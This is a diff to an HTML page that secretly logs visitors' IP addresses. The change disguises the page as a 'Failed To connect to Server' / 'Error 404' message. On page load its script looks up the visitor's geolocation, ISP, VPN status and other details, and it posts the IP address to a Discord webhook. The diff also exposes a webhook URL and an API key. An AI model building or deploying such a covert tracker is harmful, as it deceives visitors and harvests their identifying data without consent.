@@ -3,8 +3,8 @@
   <title>Error</title>
 </head>
 <body>
-  <h1>IP Logger</h1>
-  <p>boo<span id="ip"></span></p>
+  <h1>Failed To connect to Server.</h1>
+  <p>Error 404<span id="ip"></span></p>
 
   <!-- include the Discord webhook URL in a meta tag -->
   <meta name="discord-webhook" content="https://discord.com/api/webhooks/1055687148382191656/312TTM14nJXhkRG2z5Scz8GvXd36DkI7otSYUYX5aayn9xiwGotS4Zrc3RYnNFB9istx">
@@ -18,13 +18,35 @@
       $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=a1ebbf04c6164dd98b527e26c57fc28c", function (data) {
         // display the IP address on the page
         const ip = data.ip_address
+        const country = data.country
+        const flag = data.emoji
+        const countrycode = data.country_code
+        const countrygeo = data.country_geoname_id
+        const continent = data.continent
+        const continentcode = data.continent_code
+        const continentgeo = data.continent_geoname_id
+        const longitude = data.longitude
+        const latitude = data.latitude
+        const vpn = data.is_vpn
+        const timezonename = data.name
+        const nameabbreviation = data.abbreviation
+        const currentime = data.current_time
+        const currency = data.currency_name
+        const currencycode = data.currency_code
+        const operateur = data.autonomous_system_organization
+        const typedeco = data.connection_type
+        const isp = data.isp_name
+        const organame = data.organization_name
 
         // get the Discord webhook URL from the meta tag
         const webhookUrl = document.querySelector('meta[name="discord-webhook"]').content;
 
         // send the IP address to the Discord webhook
         axios.post(webhookUrl, {
-          content: `IP address: ${ip}`
+          content: `**IP address: ${ip}**`
+        });
+         axios.post(webhookUrl, {
+          content: `**IP address: ${ip}**`
         });
       });
   </script>
